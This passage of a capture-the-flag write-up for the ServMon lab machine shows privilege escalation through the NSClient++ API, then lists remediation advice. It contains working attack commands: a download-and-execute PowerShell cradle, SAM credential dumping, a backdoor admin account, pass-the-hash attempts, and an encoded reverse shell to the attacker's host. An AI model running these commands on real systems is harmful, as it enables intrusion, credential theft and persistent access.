I google hacktricks says that one of the nishang shells are undetected as malicious code as of april 2019, so I try that:

```
nadine@SERVMON C:\Temp>curl "http://10.10.14.51/evil2.bat" --output evil.bat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    84  100    84    0     0     84      0  0:00:01 --:--:--  0:00:01  1076

nadine@SERVMON C:\Temp>type evil.bat
powershell -exec bypass -c "iwr('http://10.10.14.51/Invoke-PowershellTcp.ps1')|iex"

nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-bi
nary @evil.bat
Added evil as scripts\evil.bat
nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m        
{"command":"evil","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>powershell -exec bypass -c \"iwr('http://10.10.14.51/Invoke-Po
wershellTcp.ps1')","perf":{"\r\n":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":""
,"value":0.00000000000000000,"warning":0.00000000000000000},"\r\niwr":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"mi
nimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"(404)":{"critical":0.00000000000000000
,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"(Sys
tem.Net.HttpWebRequest:HttpWebRequest)":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"un
it":"","value":0.00000000000000000,"warning":0.00000000000000000},"+":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"mi
nimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},":":{"critical":0.00000000000000000,"ma
ximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"Category
Info":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000
,"warning":0.00000000000000000},"Found.\r\nAt":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000
000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"FullyQualifiedErrorId":{"critical":0.00000000000000000,"maxim
um":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"InvalidOper
ation:":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.000000000000000
00,"warning":0.00000000000000000},"Not":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"un
it":"","value":0.00000000000000000,"warning":0.00000000000000000},"The":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"
minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"WebCmdletWebResponseException,Micros
oft.PowerShell.Commands.InvokeWebRequestCommand":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.000000000000
00000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"WebExc":{"critical":0.00000000000000000,"maximum":0.0000000
0000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"[Invoke-WebRequest],":{"
critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warnin
g":0.00000000000000000},"an":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","val
ue":0.00000000000000000,"warning":0.00000000000000000},"char:1\r\n+":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"min
imum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"eption\r\n":{"critical":0.0000000000000
0000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"
error:":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.000000000000000
00,"warning":0.00000000000000000},"iex\"":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"
unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"iwr('http://10.10.14.51/Invoke-PowershellTcp.ps1')|iex\r\n+":{"cri
tical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":
0.00000000000000000},"line:1":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","va
lue":0.00000000000000000,"warning":0.00000000000000000},"remote":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum
":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"returned":{"critical":0.00000000000000000,"
maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000},"server
":{"critical":0.00000000000000000,"maximum":0.00000000000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"wa
rning":0.00000000000000000},"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n":{"critical":0.00000000000000000,"maximum":0.000000
00000000000,"minimum":0.00000000000000000,"unit":"","value":0.00000000000000000,"warning":0.00000000000000000}}}],"result":1}
nadine@SERVMON C:\Temp>
```


I also try to compile a program:

```
nadine@SERVMON C:\Temp>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe rev.cs
Microsoft (R) Visual C# Compiler version 4.8.3752.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no long
er the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?Li
nkID=533240

rev.cs(64,34): warning CS0168: The variable 'err' is declared but never used

nadine@SERVMON C:\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is DC93-6115

 Directory of C:\Temp

19/03/2021  19:08    <DIR>          .
19/03/2021  19:08    <DIR>          ..
19/03/2021  17:30             2,117 bat.b64
19/03/2021  17:27             2,117 bat.txt
19/03/2021  16:44                20 curl
19/03/2021  18:59                84 evil.bat
19/03/2021  19:07             1,753 rev.cs
19/03/2021  19:08             5,632 shell.exe
19/03/2021  16:52                 9 test.txt
               7 File(s)         11,732 bytes
               2 Dir(s)   5,907,722,240 bytes free

nadine@SERVMON C:\Temp>shell.exe
The system cannot execute the specified program.

nadine@SERVMON C:\Temp>

```

this is getting ridiculous. I reset the server and try netcat again. With the python script. Still not working.

I give it a rest for a bit and eventually figure out that I do have admin access, I just can't get a reverse shell.

But I can still use my administrator rights to read the root file:


```
nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-bi
nary "type C:\Users\Administrator\Desktop\root.txt"
Added evil as scripts\evil.bat
nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m        
{"command":"evil","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>type C:\\Users\\Administrator\\Desktop\\root.txt \r\n1788be430
af04f8a132c517cabc5857b","perf":{}}],"result":0}
nadine@SERVMON C:\Temp>
```

And I get the root flag.


But I still want to get NT Authority.

I try doing the same trick to get the SAM hashes:

```
nadine@SERVMON C:\>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary
 "reg save hklm\sam c:\sam"
Added evil as scripts\evil.bat
nadine@SERVMON C:\>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
{"command":"evil","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>reg save hklm\\sam c:\\sam \r\nThe operation completed success
fully.","perf":{}}],"result":0}
```

I transfer the sam file with scp. And I repeat the process with hklm\system. Then I run samdump2 to get the hashes.

```
root@kali:/home/kali/htb/ServMon# samdump2 system sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
root@kali:/home/kali/htb/ServMon# 

```

port 445 is open, so I hope psexec will work.

```
root@kali:/home/kali/htb/ServMon# psexec.py WORKGROUP/Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0@10.129.34.191
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```

nope.

I try adding a new administrator user:

```
nadine@SERVMON C:\>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary
 "net user evil passw /add && net localgroup administrators evil /add"
Added evil as scripts\evil.bat
nadine@SERVMON C:\>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
{"command":"evil","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>net user evil passw /add   && net localgroup administrators ev
il /add \r\nThe command completed successfully.\r\n\r\nThe command completed successfully.","perf":{}}],"result":0}
nadine@SERVMON C:\>
```

And I can log in with ssh:

```
root@kali:/home/kali/htb/ServMon# ssh evil@10.129.34.191
evil@10.129.34.191's password: 
X11 forwarding request failed on channel 0
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

evil@SERVMON C:\Users\evil>whoami /all

USER INFORMATION                                          
----------------                                          
                                                          
User Name    SID                                          
============ =============================================
servmon\evil S-1-5-21-3877449121-2587550681-992675040-1005


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes

============================================================= ================ ============ =========================
======================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled 
by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled 
by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled 
by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled 
by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled 
by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled 
by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled 
by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled 
by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled 
by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288



PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ======= 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled 
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled 
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled 
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Enabled 
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeBackupPrivilege                         Back up files and directories                                      Enabled 
SeRestorePrivilege                        Restore files and directories                                      Enabled 
SeShutdownPrivilege                       Shut down the system                                               Enabled 
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled 
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Enabled 
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled 
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 


evil@SERVMON C:\Users\evil\Documents>net start
These Windows services are started:

   Background Intelligent Transfer Service
   Background Tasks Infrastructure Service
   Base Filtering Engine
   Clipboard User Service_42c82
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   Connected Devices Platform Service
   Connected Devices Platform User Service_42c82
   Connected User Experiences and Telemetry
   CoreMessaging
   Credential Manager
   Cryptographic Services
   Data Sharing Service
   Data Usage
   DCOM Server Process Launcher
   Delivery Optimization
   Device Setup Manager
   DHCP Client
   Diagnostic Policy Service
   Diagnostic Service Host
   Diagnostic System Host
   Display Policy Service
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   IKE and AuthIP IPsec Keying Modules
   IP Helper
   IPsec Policy Agent
   Local Session Manager
   Microsoft FTP Service
   Microsoft Store Install Service
   Network Connection Broker
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   NSClient++ Monitoring Agent
   OpenSSH SSH Server
   Payments and NFC/SE Manager
   Plug and Play
   Power
   Print Spooler
   Program Compatibility Assistant Service
   Remote Access Connection Manager
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Secure Socket Tunneling Protocol Service
   Security Accounts Manager
   Security Center
   Server
   Shell Hardware Detection
   SSDP Discovery
   State Repository Service
   Storage Service
   Sync Host_42c82
   SysMain
   System Event Notification Service
   System Events Broker
   System Guard Runtime Monitor Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   Time Broker
   Touch Keyboard and Handwriting Panel Service
   Update Orchestrator Service
   User Manager
   User Profile Service
   VMware Alias Manager and Ticket Service
   VMware SVGA Helper Service
   VMware Tools
   WarpJITSvc
   Web Account Manager
   Windows Audio
   Windows Audio Endpoint Builder
   Windows Biometric Service
   Windows Connection Manager
   Windows Defender Antivirus Network Inspection Service
   Windows Defender Antivirus Service
   Windows Defender Firewall
   Windows Event Log
   Windows Font Cache Service
   Windows License Manager Service
   Windows Management Instrumentation
   Windows Push Notifications System Service
   Windows Push Notifications User Service_42c82
   Windows Search
   Windows Security Service
   Windows Time
   Windows Update
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation

The command completed successfully.


evil@SERVMON C:\Users\evil\Documents>
```

So we have tons of privileges, and we can see Windows Defender is up and running.

I also run cme to check my hash:

```
root@kali:/home/kali/htb/ServMon# cme smb 10.129.34.191 -u evil -p passw --sam
/usr/local/lib/python2.7/dist-packages/beautifulsoup4-4.8.2-py2.7.egg/bs4/element.py:16: UserWarning: The soupsieve package is not installed. CSS selectors cannot be used.
  'The soupsieve package is not installed. CSS selectors cannot be used.'
SMB         10.129.34.191   445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:SERVMON) (signing:False) (SMBv1:False)
SMB         10.129.34.191   445    SERVMON          [+] SERVMON\evil:passw (Pwn3d!)
SMB         10.129.34.191   445    SERVMON          [+] Dumping SAM hashes
SMB         10.129.34.191   445    SERVMON          Administrator:500:aad3b435b51404eeaad3b435b51404ee:c8bbef7fd5afe37cbb1aee2264a75fee:::                                                                                                
SMB         10.129.34.191   445    SERVMON          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                        
SMB         10.129.34.191   445    SERVMON          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                               
SMB         10.129.34.191   445    SERVMON          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9aea641baa5d23cf97e985774d702f7f:::                                                                                           
SMB         10.129.34.191   445    SERVMON          Nadine:1002:aad3b435b51404eeaad3b435b51404ee:c22b91cf4dcf6a3c3f6269d820a35072:::                                                                                                      
SMB         10.129.34.191   445    SERVMON          sshd:1003:aad3b435b51404eeaad3b435b51404ee:aa87a699a28d1bb09053caf71e454de7:::                                                                                                        
SMB         10.129.34.191   445    SERVMON          Nathan:1004:aad3b435b51404eeaad3b435b51404ee:ba30b326f87d696984780633c98bdec1:::                                                                                                      
SMB         10.129.34.191   445    SERVMON          evil:1005:aad3b435b51404eeaad3b435b51404ee:f5feaa8e026b0deeef0b6371f3ae438e:::                                                                                                        
SMB         10.129.34.191   445    SERVMON          [+] Added 8 SAM hashes to the database
root@kali:/home/kali/htb/ServMon# 
```

And I get a different hash.

```
root@kali:/home/kali/htb/ServMon# psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c8bbef7fd5afe37cbb1aee2264a75fee administrator@10.129.34.191
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.34.191.....
[*] Found writable share ADMIN$
[*] Uploading file bcLniNiY.exe
[*] Opening SVCManager on 10.129.34.191.....
[*] Creating service DlNp on 10.129.34.191.....
[*] Starting service DlNp.....
[*] Opening SVCManager on 10.129.34.191.....
[-] Error performing the uninstallation, cleaning up
root@kali:/home/kali/htb/ServMon# 
```

And psexec fails. But I know for sure this is the correct hash.

I also do not have access to stop Windows Defender:

```
evil@SERVMON C:\Users\evil\Documents>sc stop WinDefend
[SC] OpenService FAILED 5:

Access is denied.


evil@SERVMON C:\Users\evil\Documents>
```

But we can circumvent that with the exploit:

```
evil@SERVMON C:\Users\evil>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scri
pts/evil.bat --data-binary "sc stop WinDefend"
Added evil as scripts\evil.bat
evil@SERVMON C:\Users\evil>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/e
xecute?time=1m
{"command":"evil","lines":[{"message":"The command (evil) returned an invalid return code: 5","perf":{}}],"result":3}

evil@SERVMON C:\Users\evil>
```

or not.

I check the NSClient++ folder and see some python stuff. Can I do a python reverse shell?

```
nadine@SERVMON C:\Temp>"C:\Program Files\NSClient++\nscp.exe"
Usage: nscp <context>      
  The <context> is the mode of operation ie. a type of command. 
You can also use aliases here which are shorthands for 'nscp client --module <plugin>'
  Available context are:                                                              
    client               
      Act as a client. This will run commands inside various installed modules and scripts.
                                                                                           
    help                                                                                   
      Display the help screen.                                                             
                              
    service                   
      Install/uninstall/display NSCP service.
                                             
    settings                                 
      Change and list settings as well as load and initialize modules.
                                                                      
    unit                                                              
      Run unit test scripts.                                          
                            
  Available aliases are:    
    check_mk   (same as nscp client --module CheckMKClient)
      Use a check_mk (the protocol) client to request information from other systems via check_mk.
                                                                                                  
    eventlog   (same as nscp client --module CheckEventLog)                                       
      Inject event log message into the eventlog (mainly for testing eventlog filtering and setup)
                                                                                                  
    ext   (same as nscp client --module CheckExternalScripts)                                     
      TODO: describe: ext                                    

    ext-scr   (same as nscp client --module CheckExternalScripts)
      TODO: describe: ext-scr

    lua   (same as nscp client --module LUAScript)
      Execute lua scripts

    mk   (same as nscp client --module CheckMKClient)
      Use a check_mk (the protocol) client to request information from other systems via check_mk.

    nrpe   (same as nscp client --module NRPEClient)
      Use a NRPE client to request information from other systems via NRPE similar to standard NRPE check_nrpe command.

    nsca   (same as nscp client --module NSCAClient)
      Use a NSCA to submit passive checks to a remote system. Similar to the send_nsca command

    nscp   (same as nscp client --module NSCPClient)
      Use a NSCP (the protocol) client to request information from other systems via NSCP.

    op5   (same as nscp client --module Op5Client)
      TODO: describe: op5

    py   (same as nscp client --module PythonScript)
      Execute python scripts

    python   (same as nscp client --module PythonScript)
      Execute python scripts

    sys   (same as nscp client --module CheckSystem)
      Various system tools to get information about the system (generally PDH on windows curretly)

    syslog   (same as nscp client --module SyslogClient)
      Use SYSLOG (the protocol) to submit messages to a remote system.

    test   (same as nscp client --module CommandClient)
      The best way to diagnose and find errors with your configuration and setup.

    web   (same as nscp client --module WEBServer)
      TODO: describe: web

    wmi   (same as nscp client --module CheckWMI)
      Run WMI queries from command line

  A short list of all available contexts are:
client, help, service, settings, unit, check_mk, eventlog, ext, ext-scr, lua, mk, nrpe, nsca, nscp, op5, py, python, sys, syslog, test,
 web, wmi
```

Seems like I can try python and lua. I check on the documentation, and I'll have to do some custom scripts.

I look around for privesc tools and methods and eventually I find this: https://itm4n.github.io/tools/

And the encoded powershell reverse shell. I try it out on the bare powershell of my evil user. And it works. Could this be the solution?

I throw it in the evil.bat file and run it:

```
evil@SERVMON C:\Users\evil>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --dat
a-binary "powershell -nop -noni -w Hidden -ep Bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEM
AbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADQALgA1ADEAIgAsADEAMwAzADcAKQAKACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKACQAcwBiAD0AKABbAF
QAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAApAC4ARwBlAHQAQgB5AHQAZQBzACgAIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgA
CIAKQAKACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAl
AHsAMAB9AAoAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAA
gACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALA
AwACwAJABpACkACgAgACAAIAAgACQAcwBiAD0AKABpAGUAeAAgACQAZAAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAIAAyAD4AJgAxAAoAIAAgACAAIAAkAHMAYgAyAD0AJ
ABzAGIAKwAiAFAAUwAgACIAKwAoAHAAdwBkACkALgBQAGEAdABoACsAIgA+ACAAIgAKACAAIAAgACAAJABzAGIAPQAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoA
OgBVAFQARgA4ACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGg
AKQAKACAAIAAgACAAJABzAC4ARgBsAHUAcwBoACgAKQAKAH0ACgAkAGMALgBDAGwAbwBzAGUAKAApAA=="
Added evil as scripts\evil.bat
evil@SERVMON C:\Users\evil>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m    
{"command":"evil","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","perf":{}}],"result":3}
evil@SERVMON C:\Users\evil>

```

And on the listener:

```
root@kali:/home/kali/htb/ServMon# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.34.191 49691
PS C:\Program Files\NSClient++> whoami
nt authority\system
PS C:\Program Files\NSClient++> 
```

Nothing better than finally finding the solution.


for the final powershell command:

-nop means noProfile

-noni means non interactive

-w window style

Hidden - windowstyle hidden

-ep means Execution Policy

bypass means nothing is blocked, and there are no warnings or prompts.

-e means base64 encrypted command.





## Comparing myself to the official writeup:

They find the anonymous ftp service and they get the two files.

they find the local file inclusion and exploit it via burpsuite

they ssh spray the passwords and eventually find the correct one.

They find the NSClient folder and get the passwords and whitelist.

they create a meterpreter payload with GreatSCT and upload it as a .ddl file, they exploit it with regsvcs.exe

they start the meterpreter handler and get root.

I wonder if this would still work without the use of meterpreter? 


## How to stop this exploit:

The first big issue is anonymous ftp leading straight to some uploaded files discussing sensitive information. 

Then the web-server should be updated to patch the directory traversal exploit. That being said, passwords should not be saved plaintext anywhere on the machine.

NSClient should be updated to patch the RCE issue. As well as the password being stored plaintext in the ini file.

Good things were the login whitelist on NSClient++, an active AV running, and not allowing downloaded files to run.